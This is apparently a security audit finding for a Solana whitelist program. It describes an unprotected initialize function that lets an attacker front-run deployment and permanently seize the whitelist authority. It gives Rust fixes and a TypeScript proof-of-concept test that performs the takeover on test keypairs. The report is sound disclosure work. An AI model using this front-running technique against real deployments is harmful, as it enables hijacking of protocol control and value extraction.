# Audit Report

## Title
Unprotected Whitelist Initializer Enables Front-Running Attack and Permanent Authority Takeover

## Summary
The `initialize` function in the whitelist program lacks access control, allowing any attacker to front-run the legitimate initialization transaction during deployment and permanently seize control of the whitelist authority. This completely compromises the protocol's access control system for resolver registration.

## Finding Description

The whitelist program's initialization function has a critical access control vulnerability that allows any actor to become the whitelist authority during deployment. [1](#0-0) 

The `Initialize` account validation struct only requires that the caller is a `Signer<'info>`, with no additional constraints on who can call this critical initialization function: [2](#0-1) 

The whitelist state PDA is deterministic, derived from a constant seed with no additional parameters: [3](#0-2) 

This deterministic derivation is confirmed in the client-side utilities: [4](#0-3) 

**Attack Scenario:**

1. **Deployment Detection**: The 1inch team deploys the whitelist program (publicly visible on-chain)
2. **Front-Running Attack**: A malicious actor monitors for initialization transactions and submits their own `initialize` transaction with a higher priority fee
3. **Attacker Wins Race**: The attacker's transaction executes first, creating the whitelist_state PDA with the attacker set as authority
4. **Legitimate Transaction Fails**: The legitimate initialization fails because Anchor's `init` constraint prevents reinitializing an already-initialized account
5. **Permanent Takeover**: The attacker now permanently controls all resolver registration/deregistration operations

The `register` and `deregister` functions both enforce that only the whitelist authority can execute them: [5](#0-4) [6](#0-5) 

The `set_authority` function requires the current authority to sign, providing no recovery mechanism once a malicious actor becomes the authority: [7](#0-6) 

This breaks the protocol's critical access control invariant that only authorized, KYC/KYB-verified resolvers can participate in order resolution. An attacker controlling the whitelist authority can bypass this entirely, as all order filling operations depend on resolver whitelist status: [8](#0-7) 

Similarly, resolver cancellation operations also require whitelist validation: [9](#0-8) 

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables complete compromise of the protocol's resolver access control system:

- **Permanent Authority Hijacking**: The attacker gains permanent, irrevocable control of the whitelist authority through a one-time front-running attack during deployment
- **Complete Access Control Bypass**: The attacker can register any resolvers without KYC/KYB verification or deregister all legitimate resolvers
- **Protocol-Wide DoS**: All order filling and resolver cancellation operations depend on resolver whitelist status. An attacker can deregister all legitimate resolvers, halting all protocol operations
- **No Recovery Path**: Without redeploying the entire whitelist program and migrating all dependent contracts, there's no way to recover from this attack
- **Value Extraction**: A malicious authority could register themselves as resolvers to manipulate order execution and extract value, or hold the protocol hostage

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to succeed because:

1. **Easy to Execute**: Monitoring for program deployments and initialization transactions is trivial using standard Solana RPC methods. Front-running with higher priority fees is a well-documented attack vector on Solana
2. **One-Time Critical Window**: The initialization only happens once during deployment, making it a high-value target that attackers will actively monitor for major DeFi protocols
3. **No Technical Barriers**: Any attacker with basic Solana knowledge can construct and submit an initialize transaction
4. **Public and Predictable**: Program deployments are public on-chain, and the whitelist state address is fully predictable from the deterministic PDA derivation
5. **High Value Target**: Controlling the whitelist authority of a major DeFi protocol provides significant power and potential for profit extraction

The initialization script confirms this vulnerability, showing a standard deployment pattern without any front-running protections: [10](#0-9) 

## Recommendation

Implement one of the following solutions:

**Option 1: Authority-Constrained Initialization**
Add a hardcoded authority public key or use a configuration account that must be deployed first:

```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Define expected authority at compile time or from config
    require_keys_eq!(
        ctx.accounts.authority.key(),
        EXPECTED_AUTHORITY,
        WhitelistError::UnauthorizedInitializer
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 2: Two-Step Initialization with Upgrade Authority**
Use the program upgrade authority as validation:

```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
    
    /// CHECK: Validated against program data account
    pub program_data: UncheckedAccount<'info>,
    
    pub system_program: Program<'info, System>,
}

pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Verify authority is the program upgrade authority
    let program_data: Account<ProgramData> = Account::try_from(&ctx.accounts.program_data)?;
    require_keys_eq!(
        program_data.upgrade_authority_address.unwrap(),
        ctx.accounts.authority.key(),
        WhitelistError::UnauthorizedInitializer
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 3: Use Non-Deterministic PDA Seeds**
Include the authority's public key in the PDA seeds:

```rust
seeds = [WHITELIST_STATE_SEED, authority.key().as_ref()],
```

This makes the PDA unique to each authority, preventing front-running while allowing legitimate initialization.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../../target/types/whitelist";
import { expect } from "chai";

describe("Whitelist Front-Running Vulnerability", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.Whitelist as Program<Whitelist>;

  it("Demonstrates front-running attack on whitelist initialization", async () => {
    // Attacker keypair (malicious actor)
    const attacker = anchor.web3.Keypair.generate();
    
    // Legitimate 1inch authority keypair
    const legitimateAuthority = anchor.web3.Keypair.generate();

    // Fund both accounts
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await provider.connection.requestAirdrop(
      legitimateAuthority.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );

    // Wait for airdrops to confirm
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Compute the deterministic whitelist state PDA (known to attacker)
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );

    console.log("Whitelist State PDA (predictable):", whitelistStatePDA.toString());

    // STEP 1: Attacker front-runs and initializes first
    console.log("\n[ATTACK] Attacker initializing whitelist with their own authority...");
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();

    // Verify attacker is now the authority
    let whitelistState = await program.account.whitelistState.fetch(whitelistStatePDA);
    console.log("Current authority:", whitelistState.authority.toString());
    expect(whitelistState.authority.toString()).to.equal(attacker.publicKey.toString());
    console.log("✓ Attacker successfully became the authority");

    // STEP 2: Legitimate 1inch team tries to initialize
    console.log("\n[LEGITIMATE] 1inch team attempting to initialize...");
    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      throw new Error("Should have failed - account already initialized");
    } catch (error) {
      console.log("✗ Legitimate initialization failed (account already exists)");
      expect(error.toString()).to.include("already in use");
    }

    // STEP 3: Demonstrate attacker's control
    console.log("\n[IMPACT] Demonstrating attacker's permanent control...");
    
    // Attacker can register malicious resolvers
    const maliciousResolver = anchor.web3.Keypair.generate();
    await provider.connection.requestAirdrop(
      maliciousResolver.publicKey,
      anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));

    const [resolverAccessPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
      program.programId
    );

    await program.methods
      .register(maliciousResolver.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
        resolverAccess: resolverAccessPDA,
      })
      .signers([attacker])
      .rpc();
    
    console.log("✓ Attacker successfully registered malicious resolver");

    // Legitimate authority cannot register resolvers
    const legitimateResolver = anchor.web3.Keypair.generate();
    const [legitResolverAccessPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("resolver_access"), legitimateResolver.publicKey.toBuffer()],
      program.programId
    );

    try {
      await program.methods
        .register(legitimateResolver.publicKey)
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
          resolverAccess: legitResolverAccessPDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      throw new Error("Should have failed - unauthorized");
    } catch (error) {
      console.log("✗ Legitimate authority cannot register resolvers (Unauthorized)");
      expect(error.toString()).to.include("Unauthorized");
    }

    // STEP 4: Verify no recovery mechanism
    console.log("\n[NO RECOVERY] Attempting to recover authority...");
    try {
      await program.methods
        .setAuthority(legitimateAuthority.publicKey)
        .accountsPartial({
          currentAuthority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      throw new Error("Should have failed - not current authority");
    } catch (error) {
      console.log("✗ Cannot recover authority without attacker's cooperation");
      expect(error.toString()).to.include("Unauthorized");
    }

    console.log("\n[CONCLUSION] Attacker has permanent, irrevocable control of the whitelist authority.");
  });
});
```

## Notes

This vulnerability represents a fundamental access control failure in the initialization process. The attack is trivially executable by any actor with basic Solana knowledge and monitoring capabilities. The deterministic PDA derivation makes the target address fully predictable, and the lack of access control on the `initialize` function means any signer can claim authority.

The impact is catastrophic because the whitelist authority controls the entire resolver access control system, which is foundational to the protocol's security model. Once compromised, there is no recovery mechanism short of redeploying the entire whitelist program and migrating all dependent systems.

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L44-58)
```rust
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L66-72)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L92-98)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L115-122)
```rust
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** scripts/utils.ts (L126-133)
```typescript
export function findWhitelistStateAddress(programId: PublicKey): PublicKey {
  const [whitelistState] = PublicKey.findProgramAddressSync(
    [anchor.utils.bytes.utf8.encode("whitelist_state")],
    programId
  );

  return whitelistState;
}
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L648-653)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** scripts/whitelsit/initialize.ts (L27-34)
```typescript
  const initializeIx = await program.methods
    .initialize()
    .accountsPartial({
      authority: authorityKeypair.publicKey,
      whitelistState,
    })
    .signers([authorityKeypair])
    .instruction();
```
